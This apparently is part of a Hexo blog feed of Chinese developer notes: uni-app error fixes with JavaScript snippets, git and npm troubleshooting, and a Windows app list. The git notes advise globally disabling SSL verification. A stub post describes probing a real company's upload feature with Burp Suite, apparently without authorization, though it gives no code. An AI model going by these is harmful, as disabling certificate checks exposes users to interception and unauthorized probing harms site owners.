class="keyword">else</span> <span class="keyword">if</span>(value &gt; maxNum)&#123;</span><br><span class="line">        value = maxNum;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 改变核销数量（输入）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="variable">event</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">bindInputWriteOffNum:<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> value = event.detail.value || <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.setData(&#123;</span><br><span class="line">    writeOffNum: <span class="keyword">this</span>.calWriteOffNumRule(+value)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="取事件event的不同"><a href="#取事件event的不同" class="headerlink" title="取事件event的不同"></a>取事件event的不同</h3><pre><code>小程序：event.currentTarget.dataset</code></pre><h3 id="控制台错误汇总"><a href="#控制台错误汇总" class="headerlink" title="控制台错误汇总"></a>控制台错误汇总</h3><ul><li><p>Browserslist: caniuse-lite is outdated. Please run next command <code>npm update</code></p>  <figure class="highlight plain"><figcaption><span>i caniuse-lite` / `npm update caniuse-lite` / `npm i -g caniuse-lite```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- getApp() 操作失败，v3模式加速了首页 nvue 的启动速度，当在首页 nvue 中使用 getApp() 不一定可以获取真正的 App 对象。</span><br><span class="line">    </span><br><span class="line">    v3模式加速了首页 nvue 的启动速度，当在首页 nvue 中访问 getApp 不一定可以获取真正的 App 对象。对此v3版本提供了const app = getApp(&#123;allowDefault: true&#125;)用来获取原始的app对象，可以用来在首页对globalData等初始化</span><br><span class="line"></span><br><span class="line">- You should write display: flex by final spec instead of display: box</span><br><span class="line"></span><br><span class="line">    将 display:box 改为 display:flex</span><br><span class="line"></span><br><span class="line">-  Module parse failed: The keyword &apos;package&apos; is reserved </span><br><span class="line"></span><br><span class="line">    目前（2020/07/20）HBuilderX的云打包使用了V3模式（严格模式），避免代码中出现“关键词”，尤其注意Vue模板。</span><br><span class="line"></span><br><span class="line">- xx undefined</span><br><span class="line"></span><br><span class="line">    严格判断Vue模板和js文件中是否存在文件未定义情况，对未初始化的变量进行undefined判断，例如：person &amp;&amp; person.info</span><br><span class="line"></span><br><span class="line">- Property or method &quot;toJSON&quot; is not defined on the instance but referenced during render. Make sure that this property is reactive, either in the data option, or for class-based components, by initializing the property</span><br><span class="line"></span><br><span class="line">    严格模式下，不允许变量随意更改类型。</span><br><span class="line"></span><br><span class="line">- Avoid adding reactive properties to a Vue instance or its root $data at runtime - declare it upfront in the data option.</span><br><span class="line"></span><br><span class="line">    ```js</span><br><span class="line">        let pages = getCurrentPages(),</span><br><span class="line">        prePage = pages[pages.length - 2];</span><br><span class="line">    if(prePage.$vm.hasOwnProperty(&apos;isTurnBack&apos;))&#123; // 加上判断</span><br><span class="line">        prePage.$vm.setData(&#123;</span><br><span class="line">        isTurnBack: true</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>Unbalanced delimiter found in string</p>  <figure class="highlight plain"><figcaption><span>#ifdef``` 没有闭合，加上 ```// #endif```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 无法将“keytool”项识别为 cmdlet、函数、脚本文...</span><br><span class="line"></span><br><span class="line">    进入D:\Program Files\Java\jdk1.8.0_251\jre\bin，shift+右键启用cmd，输入：keytool -importkeystore -srckeystore zhichi.keystore -destkeystore zhichi.keystore -deststoretype pkcs12</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 组件的引入方式-讨论</span><br><span class="line"></span><br><span class="line">在`src\components`下组件中引用App.vue的方法时，可以使用宏任务setTimeout先行执行引入</span><br><span class="line"></span><br><span class="line">```js</span><br><span class="line">let app = &#123;&#125;</span><br><span class="line"></span><br><span class="line">setTimeout(()=&gt;&#123;</span><br><span class="line">  app = getApp(&#123;allowDefault: true&#125;).globalData;</span><br><span class="line">&#125;,100)</span><br></pre></td></tr></table></figure></li></ul><p><a href="https://ask.dcloud.net.cn/question/66748" rel="external nofollow noopener noreferrer" target="_blank">https://ask.dcloud.net.cn/question/66748</a></p><h3 id="使用-this-setData-无效"><a href="#使用-this-setData-无效" class="headerlink" title="使用 this.setData 无效"></a>使用 this.setData 无效</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src\main.js</span></span><br><span class="line">Vue.prototype.setData = <span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> that = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">let</span> keys = [];</span><br><span class="line">    <span class="keyword">let</span> val, data;</span><br><span class="line">    <span class="built_in">Object</span>.keys(obj).forEach(<span class="function"><span class="keyword">function</span> (<span class="params">key</span>) </span>&#123;</span><br><span class="line">      keys = key.replace(<span class="regexp">/\]/g</span>, <span class="string">''</span>).split(<span class="regexp">/\.|\[/</span>);</span><br><span class="line">      val = obj[key];</span><br><span class="line">      data = that.$data;</span><br><span class="line">      keys.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">key2, index</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index + <span class="number">1</span> == keys.length) &#123;</span><br><span class="line">          that.$<span class="keyword">set</span>(data, key2, val);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">          <span class="keyword">if</span> (!data[key2]) &#123;</span><br><span class="line">            that.$<span class="keyword">set</span>(data, key2, &#123;&#125;);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        data = data[key2];</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>this.setData()</code>前使用<code>this.$forceUpdate()</code>进行强制刷新数据（或者手动更新数据，先赋空，再赋值原数据）</p><h3 id="上个页面进行刷新"><a href="#上个页面进行刷新" class="headerlink" title="上个页面进行刷新"></a>上个页面进行刷新</h3><p>在当前页面定义一个变量作为是否需要刷新的标记，在onShow检测改变量，在页面跳转前将该标记设置为true即可</p><h3 id="安卓app的picker-view标签不兼容indicator-class-”picker-indicator”"><a href="#安卓app的picker-view标签不兼容indicator-class-”picker-indicator”" class="headerlink" title="安卓app的picker-view标签不兼容indicator-class=”picker-indicator”"></a>安卓app的picker-view标签不兼容indicator-class=”picker-indicator”</h3><p>  <img src="./images/2020-08-07-14-21-33.png" alt><br>  <img src="./images/2020-08-07-14-21-46.png" alt></p><p>解决方案：不兼容，暂无</p><h3 id="chooseImage和chooseVideo，在小程序上和app上的“取消选择”fail差异"><a href="#chooseImage和chooseVideo，在小程序上和app上的“取消选择”fail差异" class="headerlink" title="chooseImage和chooseVideo，在小程序上和app上的“取消选择”fail差异"></a>chooseImage和chooseVideo，在小程序上和app上的“取消选择”fail差异</h3><p>解决：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// #ifdef MP-WEIXIN</span></span><br><span class="line"><span class="keyword">if</span> (err.errMsg != <span class="string">'chooseVideo:fail cancel'</span>) &#123;</span><br><span class="line">    app.showModal(&#123;</span><br><span class="line">    content: <span class="string">'上传出错，请重新选择上传'</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// #endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// #ifdef APP-PLUS</span></span><br><span class="line"><span class="keyword">if</span> (err.errMsg != <span class="string">'chooseVideo:fail'</span>) &#123;</span><br><span class="line">    app.showModal(&#123;</span><br><span class="line">    content: <span class="string">'上传出错，请重新选择上传'</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// #endif</span></span><br></pre></td></tr></table></figure><h3 id="app对cover-view标签貌似不太友好"><a href="#app对cover-view标签貌似不太友好" class="headerlink" title="app对cover-view标签貌似不太友好"></a>app对cover-view标签貌似不太友好</h3><p>解决：临时解决方案为改为view</p><h3 id="使用prePage的地方，需要使用-vm替换data，例如："><a href="#使用prePage的地方，需要使用-vm替换data，例如：" class="headerlink" title="使用prePage的地方，需要使用$vm替换data，例如："></a>使用prePage的地方，需要使用$vm替换data，例如：</h3><p>解决：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> pages = getCurrentPages();</span><br><span class="line"><span class="keyword">let</span> prePage = pages[pages.length - <span class="number">2</span>];</span><br><span class="line"><span class="keyword">let</span> innerText = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> (that.type == <span class="string">'text'</span>) &#123;</span><br><span class="line">    innerText = prePage.$vm.topicParam.text;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (that.type == <span class="string">'hidden_content'</span>) &#123;</span><br><span class="line">    innerText = prePage.$vm.topicParam.hidden_content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原本使用prePage.data传值，现改为prePage.$vm，但是$vm为VueComponent类型，故采用以下办法筛选出data的值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> prePageData = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> item <span class="keyword">in</span> prePage.$vm)&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> prePage.$vm[item] != <span class="string">'function'</span> &amp;&amp; <span class="regexp">/^[a-zA-Z]+$/</span>.test(item))&#123;</span><br><span class="line">    <span class="built_in">Object</span>.assign(prePageData,&#123; [item]:prePage.$vm[item]&#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.setData(&#123;</span><br><span class="line">  couponInfo: prePageData,</span><br><span class="line">  appName: app.gbData.appName</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="更新switch的checked"><a href="#更新switch的checked" class="headerlink" title="更新switch的checked"></a>更新switch的checked</h3><p>参考(<a href="https://ask.dcloud.net.cn/question/75669)方法，更新switch的checked" rel="external nofollow noopener noreferrer" target="_blank">https://ask.dcloud.net.cn/question/75669)方法，更新switch的checked</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 先更新checked</span></span><br><span class="line">that.$<span class="keyword">set</span>(that.storeConfig.cart_config, 'is_merge_shoppingcart', value ? 1 : 0)</span><br><span class="line">if(value)&#123;</span><br><span class="line">app.showModal(&#123;</span><br><span class="line">    content: <span class="string">'合并购物车之后，微信支付将不能进行分账。若想继续使用分账功能，请关闭合并购物车!'</span>,</span><br><span class="line">    showCancel: <span class="literal">true</span>,</span><br><span class="line">    confirm: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    that.setData(&#123;</span><br><span class="line">        <span class="string">'storeConfig.cart_config.is_merge_shoppingcart'</span>: <span class="number">1</span></span><br><span class="line">    &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    cancel: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    that.setData(&#123;</span><br><span class="line">        <span class="string">'storeConfig.cart_config.is_merge_shoppingcart'</span>: <span class="number">0</span></span><br><span class="line">    &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">that.setData(&#123;</span><br><span class="line">    <span class="string">'storeConfig.cart_config.is_merge_shoppingcart'</span>: <span class="number">0</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="对象传URL不兼容非V8引擎"><a href="#对象传URL不兼容非V8引擎" class="headerlink" title="对象传URL不兼容非V8引擎"></a>对象传URL不兼容非V8引擎</h3><p>在打包app后，由于app失去了V8引擎（调试的时候有V8），此时下方方法出现了不兼容的情况：会出现<code>a=1,2</code>的情况，期望能出现<code>a[0]=1,a[2]=2</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不兼容非V8引擎</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">modifyPostParam</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> query = <span class="string">''</span>,</span><br><span class="line">            name, value, fullSubName, subName, subValue, innerObj, i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(name <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        value = obj[name];</span><br><span class="line">        <span class="keyword">if</span>(value <span class="keyword">instanceof</span> <span class="built_in">Array</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; value.length; ++i) &#123;</span><br><span class="line">                subValue = value[i];</span><br><span class="line">                fullSubName = name + <span class="string">'['</span> + i + <span class="string">']'</span>;</span><br><span class="line">                innerObj = &#123;&#125;;</span><br><span class="line">                innerObj[fullSubName] = subValue;</span><br><span class="line">                query += modifyPostParam(innerObj) + <span class="string">'&amp;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(value <span class="keyword">instanceof</span> <span class="built_in">Object</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(subName <span class="keyword">in</span> value) &#123;</span><br><span class="line">                subValue = value[subName];</span><br><span class="line">                fullSubName = name + <span class="string">'['</span> + subName + <span class="string">']'</span>;</span><br><span class="line">                innerObj = &#123;&#125;;</span><br><span class="line">                innerObj[fullSubName] = subValue;</span><br><span class="line">                query += modifyPostParam(innerObj) + <span class="string">'&amp;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(value !== <span class="literal">undefined</span> &amp;&amp; value !== <span class="literal">null</span>)</span><br><span class="line">            query += <span class="built_in">encodeURIComponent</span>(name) + <span class="string">'='</span> + <span class="built_in">encodeURIComponent</span>(value) + <span class="string">'&amp;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> query.length ? query.substr(<span class="number">0</span>, query.length - <span class="number">1</span>) : query;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(modifyPostParam(&#123;</span><br><span class="line">    <span class="string">"pick_up_type"</span>: [<span class="string">"1"</span>, <span class="string">"2"</span>]</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 兼容非V8引擎</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">modifyPostParam</span> (<span class="params">param, key, encode</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (param == <span class="literal">null</span>) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">var</span> paramStr = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">var</span> t = <span class="keyword">typeof</span>(param);</span><br><span class="line">  <span class="keyword">if</span> (t == <span class="string">'string'</span> || t == <span class="string">'number'</span> || t == <span class="string">'boolean'</span>) &#123;</span><br><span class="line">    paramStr += <span class="string">'&amp;'</span> + key + <span class="string">'='</span> + ((encode == <span class="literal">null</span> || encode) ? <span class="built_in">encodeURIComponent</span>(param) : param);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> param) &#123;</span><br><span class="line">      <span class="keyword">var</span> k = key == <span class="literal">null</span> ? i : key + <span class="string">'['</span> + i + <span class="string">']'</span>;</span><br><span class="line">      paramStr += <span class="keyword">this</span>.modifyPostParam(param[i], k, encode);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> paramStr;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(modifyPostParam(&#123;</span><br><span class="line">  <span class="string">"pick_up_type"</span>: [<span class="string">"1"</span>, <span class="string">"2"</span>]</span><br><span class="line">&#125;)).substr(<span class="number">1</span>) <span class="comment">// 注意去掉开头的&amp;</span></span><br></pre></td></tr></table></figure><p>### </p><h3 id="参考链接汇总"><a href="#参考链接汇总" class="headerlink" title="参考链接汇总"></a>参考链接汇总</h3><p>Push推送开发指南：<a href="https://ask.dcloud.net.cn/article/34" rel="external nofollow noopener noreferrer" target="_blank">https://ask.dcloud.net.cn/article/34</a></p><p>UniPush使用指南：<a href="https://ask.dcloud.net.cn/article/35622" rel="external nofollow noopener noreferrer" target="_blank">https://ask.dcloud.net.cn/article/35622</a></p><p>百度语音合成接口：<a href="https://ext.dcloud.net.cn/plugin?id=182" rel="external nofollow noopener noreferrer" target="_blank">https://ext.dcloud.net.cn/plugin?id=182</a></p><p>什么是自定义调试基座及使用说明：<a href="https://ask.dcloud.net.cn/article/35115" rel="external nofollow noopener noreferrer" target="_blank">https://ask.dcloud.net.cn/article/35115</a></p><p><del>监听通知栏消息：<a href="https://ext.dcloud.net.cn/plugin?id=835" rel="external nofollow noopener noreferrer" target="_blank">https://ext.dcloud.net.cn/plugin?id=835</a></del></p><p><del>自定义推送铃声（iOS）：<a href="https://ext.dcloud.net.cn/plugin?id=690" rel="external nofollow noopener noreferrer" target="_blank">https://ext.dcloud.net.cn/plugin?id=690</a></del></p><p>授权登录插件配置：<a href="https://ask.dcloud.net.cn/article/192" rel="external nofollow noopener noreferrer" target="_blank">https://ask.dcloud.net.cn/article/192</a></p><p>个推文档 &gt; 服务端 &gt; PHP &gt; 概述：<a href="http://docs.getui.com/getui/server/php/summary/" rel="external nofollow noopener noreferrer" target="_blank">http://docs.getui.com/getui/server/php/summary/</a></p><p>个推文档 &gt; 服务端 &gt; NodeJs &gt; 快速入门：<a href="http://docs.getui.com/getui/server/nodejs/start/" rel="external nofollow noopener noreferrer" target="_blank">http://docs.getui.com/getui/server/nodejs/start/</a></p><p>app调试-模拟器配置：<a href="https://ask.dcloud.net.cn/article/1024" rel="external nofollow noopener noreferrer" target="_blank">https://ask.dcloud.net.cn/article/1024</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="uni-app" scheme="http://yoursite.com/categories/uni-app/"/>
    
    
      <category term="笔记" scheme="http://yoursite.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="uni-app" scheme="http://yoursite.com/tags/uni-app/"/>
    
  </entry>
  
  <entry>
    <title>github踩坑记录</title>
    <link href="http://yoursite.com/GitHub/20200421-d07c9a5d.html"/>
    <id>http://yoursite.com/GitHub/20200421-d07c9a5d.html</id>
    <published>2020-04-21T08:58:16.000Z</published>
    <updated>2021-04-08T03:18:06.361Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><a id="more"></a><h1 id="github踩坑记录"><a href="#github踩坑记录" class="headerlink" title="github踩坑记录"></a>github踩坑记录</h1><h2 id="报错记录"><a href="#报错记录" class="headerlink" title="报错记录"></a>报错记录</h2><ol><li><p>git clone 出错</p><p>报如下错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">error: RPC failed; curl 18 transfer closed with outstanding read data remaining</span><br><span class="line">fatal: the remote end hung up unexpectedly</span><br><span class="line">fatal: early EOF</span><br><span class="line">fatal: index-pack failed</span><br></pre></td></tr></table></figure><p>原因：<br>因为curl的postBuffer的默认值太小，我们需要调整它的大小，在终端重新配置大小</p><p>解决方案：<br>把postBuffer的值配置成500M<br><code>git config --global http.postBuffer 524288000</code></p><p>若再次出现问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">error: RPC failed; curl 56 OpenSSL SSL_read: Connection was reset, errno 10054</span><br><span class="line">fatal: the remote end hung up unexpectedly</span><br><span class="line">fatal: early EOF</span><br><span class="line">fatal: index-pack failed</span><br></pre></td></tr></table></figure><p>解决方案：<br>让GIt忽略SSL证书错误的方法<br><code>git config --global http.sslVerify &quot;false&quot;</code></p><p>若需要查看命令是否成功添加到git中，可使用<code>git --list</code></p></li><li><p>安装依赖报错</p><p>使用<code>npm i</code>安装依赖时，若出现错误</p><p>解决方案：<br>删除 node_modules，<code>npm cache clean --force</code>清除缓存，再尝试<code>npm i</code></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="GitHub" scheme="http://yoursite.com/categories/GitHub/"/>
    
    
      <category term="github" scheme="http://yoursite.com/tags/github/"/>
    
      <category term="笔记" scheme="http://yoursite.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>某网站漏洞利用实录</title>
    <link href="http://yoursite.com/%E7%AC%94%E8%AE%B0/20200312-5dcbe6d8.html"/>
    <id>http://yoursite.com/%E7%AC%94%E8%AE%B0/20200312-5dcbe6d8.html</id>
    <published>2020-03-12T03:36:20.000Z</published>
    <updated>2021-04-08T03:18:06.379Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><a id="more"></a><ol><li><p>发现存在上传功能</p></li><li><p>使用burp suite工具</p></li><li></li></ol><h1 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h1><p>Q：这个网站怎么找到的？</p><p>A：那时候实习期间，学院会记录各位同学的公司，由于都是一般都是互联网公司，所以他们都会有自己的公网平台，所以…</p>]]></content>
    
    <summary type="html">
    
      网络安全小白无聊瞎逛一些网站，发现有网站存在上传功能
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Window系统推荐应用</title>
    <link href="http://yoursite.com/%E7%AC%94%E8%AE%B0/20200301-53c656c1.html"/>
    <id>http://yoursite.com/%E7%AC%94%E8%AE%B0/20200301-53c656c1.html</id>
    <published>2020-03-01T14:49:15.000Z</published>
    <updated>2021-04-08T03:18:06.375Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><a id="more"></a><h2 id="Ditto"><a href="#Ditto" class="headerlink" title="Ditto"></a>Ditto</h2><p>作用：粘贴版</p><h2 id="Listary"><a href="#Listary" class="headerlink" title="Listary"></a>Listary</h2><p>作用：搜索</p><h2 id="Internet-Download-Manager"><a href="#Internet-Download-Manager" class="headerlink" title="Internet Download Manager"></a>Internet Download Manager</h2><p>作用：下载</p><h2 id="Just-Color-Picker"><a href="#Just-Color-Picker" class="headerlink" title="Just Color Picker"></a>Just Color Picker</h2><p>作用：取色<br>下载链接：<a href="http://www.pc6.com/softview/SoftView_33200.html" rel="external nofollow noopener noreferrer" target="_blank">http://www.pc6.com/softview/SoftView_33200.html</a></p><h2 id="HTTrack"><a href="#HTTrack" class="headerlink" title="HTTrack"></a>HTTrack</h2><p>作用：网页镜像</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Mimikyu开发笔记</title>
    <link href="http://yoursite.com/%E9%A1%B9%E7%9B%AE%E8%AE%B0%E5%BD%95/20200228-45ad4145.html"/>
    <id>http://yoursite.com/%E9%A1%B9%E7%9B%AE%E8%AE%B0%E5%BD%95/20200228-45ad4145.html</id>
    <published>2020-02-28T07:58:03.000Z</published>
    <updated>2021-04-08T03:18:06.355Z</updated>
    
